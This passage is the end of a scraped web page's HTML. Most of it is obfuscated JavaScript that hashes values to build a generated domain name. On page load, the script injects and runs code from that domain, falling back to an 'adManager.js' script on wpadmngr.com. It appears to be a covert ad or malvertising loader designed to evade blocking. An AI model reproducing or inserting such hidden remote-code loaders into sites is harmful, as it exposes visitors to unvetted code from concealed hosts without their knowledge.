X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>